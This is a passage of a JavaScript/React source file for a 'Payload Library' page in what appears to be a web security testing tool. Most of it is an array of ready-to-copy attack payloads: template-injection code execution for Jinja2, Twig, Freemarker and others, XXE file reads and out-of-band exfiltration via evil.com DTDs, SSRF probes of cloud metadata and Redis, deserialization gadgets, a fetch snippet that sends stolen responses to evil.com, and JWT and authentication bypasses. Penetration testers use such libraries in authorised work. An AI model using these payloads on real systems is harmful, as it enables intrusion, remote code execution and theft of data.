    payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}",
  },
  {
    id: "ssti-07",
    cat: "SSTI",
    tags: ["twig"],
    desc: "Twig file read",
    payload: "{{'/etc/passwd'|file_excerpt(1,30)}}",
  },
  {
    id: "ssti-08",
    cat: "SSTI",
    tags: ["freemarker"],
    desc: "Freemarker RCE",
    payload:
      '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
  },
  {
    id: "ssti-09",
    cat: "SSTI",
    tags: ["mako"],
    desc: "Mako RCE via import",
    payload: "<%import os%>${os.popen('id').read()}",
  },
  {
    id: "ssti-10",
    cat: "SSTI",
    tags: ["jinja2"],
    desc: "Jinja2 RCE via lipsum",
    payload: "{{lipsum.__globals__['os'].popen('id').read()}}",
  },
  {
    id: "ssti-11",
    cat: "SSTI",
    tags: ["jinja2", "sandbox"],
    desc: "Jinja2 attr bypass (sandboxed environments)",
    payload:
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
  },
  {
    id: "ssti-12",
    cat: "SSTI",
    tags: ["twig"],
    desc: "Twig map/filter filter abuse (version dependent)",
    payload: "{{['id']|filter('system')}}",
  },
  {
    id: "ssti-13",
    cat: "SSTI",
    tags: ["twig"],
    desc: "Twig _self.env registerUndefinedFilterCallback",
    payload:
      "{{_self.env.registerUndefinedFilterCallback('exec')}}}{{_self.env.getFilter('id')}}",
  },
  {
    id: "ssti-14",
    cat: "SSTI",
    tags: ["freemarker"],
    desc: "Freemarker ObjectConstructor (legacy)",
    payload:
      '<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}',
  },
  {
    id: "ssti-15",
    cat: "SSTI",
    tags: ["velocity"],
    desc: "Apache Velocity SetEvaluationContext / tool exposure test",
    payload:
      "#set($x=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))",
  },
  {
    id: "ssti-16",
    cat: "SSTI",
    tags: ["smarty"],
    desc: "Smarty {php} tag (legacy Smarty)",
    payload: "{php}system('id');{/php}",
  },
  {
    id: "ssti-17",
    cat: "SSTI",
    tags: ["smarty"],
    desc: "Smarty math equation execution (older)",
    payload: "{math equation='1*system(\"id\")'}",
  },
  {
    id: "ssti-18",
    cat: "SSTI",
    tags: ["pug"],
    desc: "Pug/Jade code block",
    payload:
      "- var x = global.process.mainModule.require('child_process').execSync('id')",
  },
  {
    id: "ssti-19",
    cat: "SSTI",
    tags: ["erb"],
    desc: "Ruby ERB code execution",
    payload: "<%= `id` %>",
  },
  {
    id: "ssti-20",
    cat: "SSTI",
    tags: ["handlebars"],
    desc: "Handlebars helper / prototype pollution chain (app-specific)",
    payload:
      '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |cons|}}{{cons.pop}}{{cons.push (cons.pop)}}',
  },
  {
    id: "ssti-21",
    cat: "SSTI",
    tags: ["detection"],
    desc: "Pebble {{ }} detection",
    payload: "{{1*1}}{{7*7}}",
  },
  {
    id: "ssti-22",
    cat: "SSTI",
    tags: ["detection"],
    desc: "Thymeleaf expression probe",
    payload: "[[${7*7}]]",
  },
  {
    id: "ssti-23",
    cat: "SSTI",
    tags: ["jinja2", "detection"],
    desc: "Jinja2 length error fingerprint",
    payload: "{{config.items()}}",
  },
  {
    id: "ssti-24",
    cat: "SSTI",
    tags: ["velocity", "detection"],
    desc: "Velocity #if math test",
    payload: "#if(7*7==49)true#{end}",
  },
  {
    id: "ssti-25",
    cat: "SSTI",
    tags: ["mako", "sandbox"],
    desc: "Mako namespace __builtins__",
    payload:
      "<%namespace name=\"x\" file=\"${__import__('os').popen('id').read()}\"/>",
  },

  // ── XXE ──
  {
    id: "xxe-01",
    cat: "XXE",
    tags: ["basic"],
    desc: "Basic file read via ENTITY",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-02",
    cat: "XXE",
    tags: ["basic"],
    desc: "Classic XXE /etc/hostname",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-03",
    cat: "XXE",
    tags: ["ssrf"],
    desc: "XXE SSRF internal port scan",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-04",
    cat: "XXE",
    tags: ["blind"],
    desc: "Blind XXE via parameter entity",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>bar</foo>',
  },
  {
    id: "xxe-05",
    cat: "XXE",
    tags: ["oob"],
    desc: "OOB data exfiltration",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>bar</foo>',
  },
  {
    id: "xxe-06",
    cat: "XXE",
    tags: ["basic"],
    desc: "PHP base64 file read via XXE",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-07",
    cat: "XXE",
    tags: ["rce"],
    desc: "XXE RCE via expect",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-08",
    cat: "XXE",
    tags: ["dos"],
    desc: "Billion Laughs DoS",
    payload:
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
  },
  {
    id: "xxe-09",
    cat: "XXE",
    tags: ["blind", "oob"],
    desc: "Blind XXE OOB file exfil via parameter entity + DTD",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://YOUR-COLLAB.example/evil.dtd">%dtd;]><foo/>',
  },
  {
    id: "xxe-10",
    cat: "XXE",
    tags: ["upload", "svg"],
    desc: "XXE inside SVG upload",
    payload:
      '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
  },
  {
    id: "xxe-11",
    cat: "XXE",
    tags: ["upload", "docx"],
    desc: "XXE in DOCX document.xml (zip entry)",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-12",
    cat: "XXE",
    tags: ["soap"],
    desc: "XXE in SOAP envelope body",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
  },
  {
    id: "xxe-13",
    cat: "XXE",
    tags: ["parameter entity"],
    desc: "Nested parameter entities (parser dependent)",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % pe1 SYSTEM "file:///etc/passwd"><!ENTITY % pe2 "<!ENTITY exfil SYSTEM \'http://YOUR-COLLAB.example/?%pe1;\'>">%pe2;]><foo>&exfil;</foo>',
  },
  {
    id: "xxe-14",
    cat: "XXE",
    tags: ["ssrf"],
    desc: "XXE SSRF to internal metadata URL",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-15",
    cat: "XXE",
    tags: ["ssrf", "ftp"],
    desc: "XXE FTP/legacy protocol SSRF idea (parser dependent)",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://internal.host:25/">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-16",
    cat: "XXE",
    tags: ["blind"],
    desc: "Error-based XXE via invalid protocol",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://invalid.invalid:9999/">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-17",
    cat: "XXE",
    tags: ["oob"],
    desc: "Out-of-band XXE with SYSTEM http callback only",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLAB.example/xxe">]><foo>&xxe;</foo>',
  },
  {
    id: "xxe-18",
    cat: "XXE",
    tags: ["basic"],
    desc: "Windows file read via XXE",
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
  },

  // ── SSRF ──
  {
    id: "ssrf-01",
    cat: "SSRF",
    tags: ["internal"],
    desc: "Loopback IPv4",
    payload: "http://127.0.0.1/",
  },
  {
    id: "ssrf-02",
    cat: "SSRF",
    tags: ["internal"],
    desc: "All interfaces shorthand",
    payload: "http://0.0.0.0:8080/",
  },
  {
    id: "ssrf-03",
    cat: "SSRF",
    tags: ["internal"],
    desc: "IPv6 loopback compressed",
    payload: "http://[::1]/",
  },
  {
    id: "ssrf-04",
    cat: "SSRF",
    tags: ["internal"],
    desc: "Decimal IP for 127.0.0.1",
    payload: "http://2130706433/",
  },
  {
    id: "ssrf-05",
    cat: "SSRF",
    tags: ["internal"],
    desc: "Hex IP for 127.0.0.1",
    payload: "http://0x7f000001/",
  },
  {
    id: "ssrf-06",
    cat: "SSRF",
    tags: ["internal"],
    desc: "Octal IP representation",
    payload: "http://0177.0.0.01/",
  },
  {
    id: "ssrf-07",
    cat: "SSRF",
    tags: ["cloud", "aws"],
    desc: "AWS IMDSv1 metadata",
    payload: "http://169.254.169.254/latest/meta-data/",
  },
  {
    id: "ssrf-08",
    cat: "SSRF",
    tags: ["cloud", "aws"],
    desc: "AWS IMDSv2 token flow (two-step)",
    payload:
      "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')",
  },
  {
    id: "ssrf-09",
    cat: "SSRF",
    tags: ["cloud", "gcp"],
    desc: "GCP metadata host header trick",
    payload: "http://metadata.google.internal/computeMetadata/v1/",
  },
  {
    id: "ssrf-10",
    cat: "SSRF",
    tags: ["cloud", "azure"],
    desc: "Azure Instance Metadata Service",
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
  },
  {
    id: "ssrf-11",
    cat: "SSRF",
    tags: ["cloud", "digitalocean"],
    desc: "DigitalOcean metadata",
    payload: "http://169.254.169.254/metadata/v1.json",
  },
  {
    id: "ssrf-12",
    cat: "SSRF",
    tags: ["dns rebinding"],
    desc: "DNS rebinding placeholder domain",
    payload: "http://YOUR-REBIND-DOMAIN.7h.de/",
  },
  {
    id: "ssrf-13",
    cat: "SSRF",
    tags: ["protocol"],
    desc: "file:// local read",
    payload: "file:///etc/passwd",
  },
  {
    id: "ssrf-14",
    cat: "SSRF",
    tags: ["protocol"],
    desc: "gopher:// internal service smuggling idea",
    payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
  },
  {
    id: "ssrf-15",
    cat: "SSRF",
    tags: ["protocol"],
    desc: "dict:// service probe",
    payload: "dict://127.0.0.1:11211/stat",
  },
  {
    id: "ssrf-16",
    cat: "SSRF",
    tags: ["redirect"],
    desc: "Open redirect chain to 127.0.0.1",
    payload: "https://YOUR-APP/redirect?url=http://127.0.0.1:8080/admin",
  },
  {
    id: "ssrf-17",
    cat: "SSRF",
    tags: ["bypass"],
    desc: "Bypass via @ creds ignored by some parsers",
    payload: "http://evil@127.0.0.1/",
  },
  {
    id: "ssrf-18",
    cat: "SSRF",
    tags: ["bypass"],
    desc: "URL fragment might truncate server-side validation",
    payload: "http://127.0.0.1#@allowed-host/",
  },
  {
    id: "ssrf-19",
    cat: "SSRF",
    tags: ["internal"],
    desc: "RFC1918 private range probe",
    payload: "http://192.168.1.1/",
  },
  {
    id: "ssrf-20",
    cat: "SSRF",
    tags: ["cloud", "kubernetes"],
    desc: "Kubernetes API default service",
    payload: "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
  },
  {
    id: "ssrf-21",
    cat: "SSRF",
    tags: ["bypass"],
    desc: "Enclosed alnum IPv6 for localhost",
    payload: "http://[0:0:0:0:0:ffff:127.0.0.1]/",
  },
  {
    id: "ssrf-22",
    cat: "SSRF",
    tags: ["internal"],
    desc: "CIDR notation sometimes mis-parsed",
    payload: "http://127.0.0.0/",
  },
  {
    id: "ssrf-23",
    cat: "SSRF",
    tags: ["cloud", "aws"],
    desc: "Link-local alternate IPv4 metadata",
    payload: "http://169.254.169.254/latest/dynamic/instance-identity/document",
  },
  {
    id: "ssrf-24",
    cat: "SSRF",
    tags: ["protocol"],
    desc: "ldap:// internal JNDI style URL (context dependent)",
    payload: "ldap://127.0.0.1:389/o=example",
  },
  {
    id: "ssrf-25",
    cat: "SSRF",
    tags: ["redirect"],
    desc: "302 open redirect to loopback",
    payload: "https://trusted.com/redirect?u=http://127.0.0.1:9200/",
  },

  // ── IDOR ──
  {
    id: "idor-01",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Sequential user id bump",
    payload: "/api/users/1002",
  },
  {
    id: "idor-02",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Replace id with another user's",
    payload: "?user_id=1",
  },
  {
    id: "idor-03",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "JSON body id swap",
    payload: '{"id": 1, "action": "delete"}',
  },
  {
    id: "idor-04",
    cat: "IDOR",
    tags: ["uuid"],
    desc: "UUID version 1 predictable time component",
    payload: "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  },
  {
    id: "idor-05",
    cat: "IDOR",
    tags: ["hash"],
    desc: "MD5 sequential id weak hash test",
    payload: "/download?file=c4ca4238a0b923820dcc509a6f75849b",
  },
  {
    id: "idor-06",
    cat: "IDOR",
    tags: ["encoding"],
    desc: "Base64 id parameter",
    payload: "/resource/MTAwMQ==",
  },
  {
    id: "idor-07",
    cat: "IDOR",
    tags: ["graphql"],
    desc: "GraphQL node ID enumeration",
    payload: '{"query":"{ user(id: \\"VXNlcjox\\") { email } }"}',
  },
  {
    id: "idor-08",
    cat: "IDOR",
    tags: ["graphql"],
    desc: "GraphQL alias batching same object",
    payload:
      '{"query":"{ a: node(id:\\"1\\"){...} b: node(id:\\"2\\"){...} }"}',
  },
  {
    id: "idor-09",
    cat: "IDOR",
    tags: ["api"],
    desc: "REST nested resource traversal",
    payload: "/api/v1/users/2/invoices/1",
  },
  {
    id: "idor-10",
    cat: "IDOR",
    tags: ["api"],
    desc: "Admin endpoint without role check",
    payload: "/api/admin/users/export",
  },
  {
    id: "idor-11",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Mass assignment id overwrite",
    payload: '{"role":"user","id":1}',
  },
  {
    id: "idor-12",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Secondary object reference swap",
    payload: '{"owner_id": 5, "document_id": 99}',
  },
  {
    id: "idor-13",
    cat: "IDOR",
    tags: ["horizontal"],
    desc: "Horizontal privilege: same role different tenant",
    payload: "X-Tenant-Id: competitor-uuid",
  },
  {
    id: "idor-14",
    cat: "IDOR",
    tags: ["vertical"],
    desc: "Vertical privilege: force admin flag",
    payload: '{"is_admin": true}',
  },
  {
    id: "idor-15",
    cat: "IDOR",
    tags: ["api"],
    desc: "Replace numeric id in multipart filename reference",
    payload: 'Content-Disposition: form-data; name="userId"\r\n\r\n1',
  },
  {
    id: "idor-16",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Negative / type confusion id",
    payload: "/api/order/-1",
  },
  {
    id: "idor-17",
    cat: "IDOR",
    tags: ["parameter"],
    desc: "Float id truncation",
    payload: "/api/item/1.999",
  },
  {
    id: "idor-18",
    cat: "IDOR",
    tags: ["batch"],
    desc: "Bulk export include other tenant ids",
    payload: '{"ids":[1,2,3,99999]}',
  },

  // ── Open Redirect ──
  {
    id: "oredir-01",
    cat: "OpenRedirect",
    tags: ["parameter"],
    desc: "Classic redirect parameter",
    payload: "/logout?next=https://evil.com",
  },
  {
    id: "oredir-02",
    cat: "OpenRedirect",
    tags: ["parameter"],
    desc: "Common redirect param names",
    payload:
      "?url=https://evil.com&continue=https://evil.com&redirect=https://evil.com",
  },
  {
    id: "oredir-03",
    cat: "OpenRedirect",
    tags: ["encoding"],
    desc: "Double URL-encoded https",
    payload: "/redirect?to=%252f%252fevil.com",
  },
  {
    id: "oredir-04",
    cat: "OpenRedirect",
    tags: ["encoding"],
    desc: "Double encoding slash",
    payload: "?next=%252f%252fevil.com%252f",
  },
  {
    id: "oredir-05",
    cat: "OpenRedirect",
    tags: ["backslash"],
    desc: "Windows backslash mixed with https",
    payload: "https:evil.com",
  },
  {
    id: "oredir-06",
    cat: "OpenRedirect",
    tags: ["protocol-relative"],
    desc: "Protocol-relative URL",
    payload: "//evil.com",
  },
  {
    id: "oredir-07",
    cat: "OpenRedirect",
    tags: ["javascript"],
    desc: "javascript: pseudo scheme",
    payload: "javascript:alert(document.domain)",
  },
  {
    id: "oredir-08",
    cat: "OpenRedirect",
    tags: ["data uri"],
    desc: "data: HTML redirect",
    payload: "data:text/html,<script>location='https://evil.com'</script>",
  },
  {
    id: "oredir-09",
    cat: "OpenRedirect",
    tags: ["parser"],
    desc: "Credential + @ confusion",
    payload: "https://trusted.com@evil.com/",
  },
  {
    id: "oredir-10",
    cat: "OpenRedirect",
    tags: ["parser"],
    desc: "Unicode homograph / IDN bypass idea",
    payload: "https://evil.com.xn--p1ai/",
  },
  {
    id: "oredir-11",
    cat: "OpenRedirect",
    tags: ["parameter"],
    desc: "Fragment-only bypass weak validators",
    payload: "/safe/path#//evil.com",
  },
  {
    id: "oredir-12",
    cat: "OpenRedirect",
    tags: ["whitespace"],
    desc: "CRLF / tab prefix before URL",
    payload: "%0d%0ahttps://evil.com",
  },
  {
    id: "oredir-13",
    cat: "OpenRedirect",
    tags: ["parameter"],
    desc: "Array parameter pollution redirect",
    payload: "?next[]=https://evil.com&next[]=https://trusted.com",
  },
  {
    id: "oredir-14",
    cat: "OpenRedirect",
    tags: ["oauth"],
    desc: "OAuth redirect_uri manipulation",
    payload: "redirect_uri=https://evil.com/callback",
  },
  {
    id: "oredir-15",
    cat: "OpenRedirect",
    tags: ["mobile"],
    desc: "App deep link open redirect",
    payload: "myapp://evil.com/@https://trusted.com/",
  },
  {
    id: "oredir-16",
    cat: "OpenRedirect",
    tags: ["parameter"],
    desc: "ReturnUrl post-login redirect",
    payload: "?ReturnUrl=https://evil.com",
  },
  {
    id: "oredir-17",
    cat: "OpenRedirect",
    tags: ["encoding"],
    desc: "Mixed case scheme https",
    payload: "HTTPS://evil.com",
  },

  // ── Deserialization ──
  {
    id: "deser-01",
    cat: "Deserialization",
    tags: ["java"],
    desc: "Java serialized magic header probe",
    payload: "aced00057372001a",
  },
  {
    id: "deser-02",
    cat: "Deserialization",
    tags: ["java"],
    desc: "ysoserial CommonsCollections1 gadget chain (concept)",
    payload: "java -jar ysoserial.jar CommonsCollections1 'calc' | base64",
  },
  {
    id: "deser-03",
    cat: "Deserialization",
    tags: ["php"],
    desc: "PHP serialized object injection",
    payload: 'O:8:"stdClass":0:{}',
  },
  {
    id: "deser-04",
    cat: "Deserialization",
    tags: ["php"],
    desc: "PHP phar metadata trigger (unserialize)",
    payload: "phar://uploads/image.jpg/test.txt",
  },
  {
    id: "deser-05",
    cat: "Deserialization",
    tags: ["python"],
    desc: "Pickle dangerous reducer pattern",
    payload: "cos\\nsystem\\n(S'id'\\ntR.",
  },
  {
    id: "deser-06",
    cat: "Deserialization",
    tags: ["dotnet"],
    desc: ".NET BinaryFormatter TypeNameHandling abuse idea",
    payload:
      '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}',
  },
  {
    id: "deser-07",
    cat: "Deserialization",
    tags: ["dotnet"],
    desc: "ObjectStateFormatter ViewState tampering marker",
    payload: "/wEPDwUKLT...base64...",
  },
  {
    id: "deser-08",
    cat: "Deserialization",
    tags: ["node"],
    desc: "Node.js serialize-javascript / vm2 style eval chain (app-specific)",
    payload:
      "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
  },
  {
    id: "deser-09",
    cat: "Deserialization",
    tags: ["ruby"],
    desc: "Ruby Marshal header detection",
    payload: `\\x04\\x08o:\\x0bUser\\x06:\\x0b@nameI"a"\\x06:\\x06ET`,
  },
  {
    id: "deser-10",
    cat: "Deserialization",
    tags: ["detection"],
    desc: "Content-Type application/x-java-serialized-object",
    payload: "Content-Type: application/x-java-serialized-object",
  },
  {
    id: "deser-11",
    cat: "Deserialization",
    tags: ["yaml"],
    desc: "YAML !!python/object/apply unsafe load",
    payload: "!!python/object/apply:os.system ['id']",
  },
  {
    id: "deser-12",
    cat: "Deserialization",
    tags: ["json"],
    desc: "Fastjson autoType gadget (version dependent)",
    payload:
      '{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}',
  },
  {
    id: "deser-13",
    cat: "Deserialization",
    tags: ["java"],
    desc: "Jackson polymorphic typing gadget hint",
    payload:
      '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://evil/"}]',
  },
  {
    id: "deser-14",
    cat: "Deserialization",
    tags: ["detection"],
    desc: "Base64 blob starting with rO0 (Java serialized)",
    payload:
      "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0A=",
  },
  {
    id: "deser-15",
    cat: "Deserialization",
    tags: ["php"],
    desc: "PHP session.serialize_handler mismatch",
    payload: '|O:4:"Test":0:{}',
  },
  {
    id: "deser-16",
    cat: "Deserialization",
    tags: ["java"],
    desc: "LDAP URL gadget in Java deserialization chain",
    payload: "ldap://YOUR-COLLAB.example/Exploit",
  },
  {
    id: "deser-17",
    cat: "Deserialization",
    tags: ["dotnet"],
    desc: "ViewState __VIEWSTATE without MAC (legacy ASP.NET)",
    payload: "__VIEWSTATE= tampered LosFormatter blob",
  },

  // ── CORS ──
  {
    id: "cors-01",
    cat: "CORS",
    tags: ["reflection"],
    desc: "Origin reflected without validation",
    payload: "Origin: https://evil.com",
  },
  {
    id: "cors-02",
    cat: "CORS",
    tags: ["reflection"],
    desc: "ACAO mirrors arbitrary Origin",
    payload: "Access-Control-Allow-Origin: https://evil.com",
  },
  {
    id: "cors-03",
    cat: "CORS",
    tags: ["null origin"],
    desc: "Null Origin with credentials",
    payload: "Origin: null",
  },
  {
    id: "cors-04",
    cat: "CORS",
    tags: ["subdomain"],
    desc: "Subdomain wildcard over-permission",
    payload: "Access-Control-Allow-Origin: *.example.com",
  },
  {
    id: "cors-05",
    cat: "CORS",
    tags: ["preflight"],
    desc: "Preflight bypass weak methods list",
    payload: "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
  },
  {
    id: "cors-06",
    cat: "CORS",
    tags: ["credentials"],
    desc: "ACAC true with reflected origin",
    payload: "Access-Control-Allow-Credentials: true",
  },
  {
    id: "cors-07",
    cat: "CORS",
    tags: ["theft"],
    desc: "Fetch exfil with creds PoC snippet",
    payload:
      "fetch('https://api.victim.com/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://evil.com/?d='+encodeURIComponent(t)))",
  },
  {
    id: "cors-08",
    cat: "CORS",
    tags: ["bypass"],
    desc: "Origin null from sandboxed iframe",
    payload:
      "<iframe sandbox='allow-scripts' srcdoc=\"<script>fetch('https://api.victim.com')</script>\"></iframe>",
  },
  {
    id: "cors-09",
    cat: "CORS",
    tags: ["regex"],
    desc: "Broken origin regex ends-with bypass",
    payload: "Origin: https://evil.com.example.com",
  },
  {
    id: "cors-10",
    cat: "CORS",
    tags: ["theft"],
    desc: "XHR withCredentials to stolen session endpoint",
    payload:
      "var x=new XMLHttpRequest();x.open('GET','/api/secret');x.withCredentials=true;x.send();",
  },
  {
    id: "cors-11",
    cat: "CORS",
    tags: ["wildcard"],
    desc: "Reflect Origin with ACAO * plus credentials mistake",
    payload: "Access-Control-Allow-Origin: *",
  },
  {
    id: "cors-12",
    cat: "CORS",
    tags: ["theft"],
    desc: "Custom header exfil PoC",
    payload: "fetch(url,{headers:{'X-Custom':'1'}})",
  },

  // ── Auth Bypass ──
  {
    id: "auth-01",
    cat: "AuthBypass",
    tags: ["default creds"],
    desc: "Common default username list",
    payload: "admin:admin / admin:password / root:root",
  },
  {
    id: "auth-02",
    cat: "AuthBypass",
    tags: ["jwt"],
    desc: "JWT alg none (unsigned)",
    payload: '{"alg":"none","typ":"JWT"}.{"sub":"admin"}.',
  },
  {
    id: "auth-03",
    cat: "AuthBypass",
    tags: ["jwt"],
    desc: "JWT RS256 to HS256 confusion (use public key as HMAC secret)",
    payload: "sign HS256 with -----BEGIN PUBLIC KEY-----",
  },
  {
    id: "auth-04",
    cat: "AuthBypass",
    tags: ["jwt"],
    desc: "JWT kid path traversal to symmetric key file",
    payload: '{"kid":"../../../../dev/null","alg":"HS256"}',
  },
  {
    id: "auth-05",
    cat: "AuthBypass",
    tags: ["pollution"],
    desc: "HTTP parameter pollution duplicate keys",
    payload: "username=admin&username=guest&password=foo",
  },
  {
    id: "auth-06",
    cat: "AuthBypass",
    tags: ["verb"],
    desc: "HTTP verb tampering HEAD instead of GET",
    payload: "HEAD /admin HTTP/1.1",
  },
  {
    id: "auth-07",
    cat: "AuthBypass",
    tags: ["verb"],
    desc: "Method override header",
    payload: "X-HTTP-Method-Override: GET",
  },
  {
    id: "auth-08",
    cat: "AuthBypass",
    tags: ["path"],
    desc: "Path normalization ../ bypass",
    payload: "/admin/../admin",
  },
  {
    id: "auth-09",
    cat: "AuthBypass",
    tags: ["path"],
    desc: "Trailing slash / case sensitivity bypass",
    payload: "/Admin/",
  },
  {
    id: "auth-10",
    cat: "AuthBypass",
    tags: ["path"],
    desc: "Unicode normalization path bypass",
    payload: "/%c0%ae%c0%ae/admin",
  },
  {
    id: "auth-11",
    cat: "AuthBypass",
    tags: ["ip"],
    desc: "X-Forwarded-For localhost spoof",
    payload: "X-Forwarded-For: 127.0.0.1",
  },
  {
    id: "auth-12",
    cat: "AuthBypass",
    tags: ["ip"],
    desc: "X-Real-IP internal network claim",
    payload: "X-Real-IP: 10.0.0.5",
  },
  {
    id: "auth-13",
    cat: "AuthBypass",
    tags: ["race"],
    desc: "Race condition double-spend coupon idea",
    payload: "parallel POST /redeem same token",
  },
  {
    id: "auth-14",
    cat: "AuthBypass",
    tags: ["session"],
    desc: "Session fixation attempt",
    payload: "Set-Cookie: SESSIONID=attacker; Path=/",
  },
  {
    id: "auth-15",
    cat: "AuthBypass",
    tags: ["api"],
    desc: "API key in query string leaked via Referer",
    payload: "/api/data?api_key=SECRET",
  },
  {
    id: "auth-16",
    cat: "AuthBypass",
    tags: ["2fa"],
    desc: "2FA skip: direct step-3 URL without completing step-2",
    payload: "/account/verify/success",
  },
  {
    id: "auth-17",
    cat: "AuthBypass",
    tags: ["oauth"],
    desc: "OAuth state parameter missing CSRF",
    payload: "/callback?code=STOLEN&state=",
  },
];

function getCategoryCounts() {
  const counts = {};
  for (const p of PAYLOADS) {
    counts[p.cat] = (counts[p.cat] || 0) + 1;
  }
  return counts;
}

export default function Payloads() {
  const [search, setSearch] = useState("");
  const [activeCat, setActiveCat] = useState(null);
  const [activeTag, setActiveTag] = useState(null);
  const counts = useMemo(getCategoryCounts, []);
  const { vars, setVar, substitute } = useVariables();

  const filtered = useMemo(() => {
    return PAYLOADS.filter((p) => {
      if (activeCat && p.cat !== activeCat) return false;
      if (activeTag && !p.tags.includes(activeTag)) return false;
      if (!search) return true;
      const q = search.toLowerCase();
      return (
        p.payload.toLowerCase().includes(q) ||
        p.desc.toLowerCase().includes(q) ||
        p.tags.some((t) => t.includes(q)) ||
        p.cat.toLowerCase().includes(q)
      );
    });
  }, [search, activeCat, activeTag]);

  const allTags = useMemo(() => {
    const set = new Set();
    const source = activeCat
      ? PAYLOADS.filter((p) => p.cat === activeCat)
      : PAYLOADS;
    source.forEach((p) => p.tags.forEach((t) => set.add(t)));
    return [...set].sort();
  }, [activeCat]);

  return (
    <div
      style={{
        display: "flex",
        gap: 16,
        height: "calc(100vh - 110px)",
      }}
    >
      {/* ── Sidebar ── */}
      <div
        style={{
          width: 220,
          flexShrink: 0,
          display: "flex",
          flexDirection: "column",
          background: "#11151E",
          borderRadius: 10,
          border: "1px solid rgba(255,255,255,0.04)",
          overflow: "hidden",
        }}
      >
        <div
          style={{
            padding: "18px 16px 14px",
            fontFamily: heading,
            fontSize: 13,
            fontWeight: 700,
            color: "#E2E8F0",
            letterSpacing: "-0.01em",
            display: "flex",
            alignItems: "center",
            gap: 8,
          }}
        >
          <Shield size={15} style={{ color: "#6EE7B7" }} />
          Payload Library
          <ToolHelp title="Payloads" description="Library of 300+ curated payloads for XSS, SQL injection, command injection, SSTI, and more." steps={["Select a category from the sidebar","Browse payloads with severity indicators","Use the search bar to find specific payloads","Click copy to grab any payload"]} tips={["Payloads are tagged by severity (Critical, High, Medium, Low)","Filter by tags for specific techniques","Great for testing web application security"]} />
        </div>

        <VariableBar vars={vars} setVar={setVar} fields={['LHOST', 'LPORT', 'TARGET', 'DOMAIN']} />

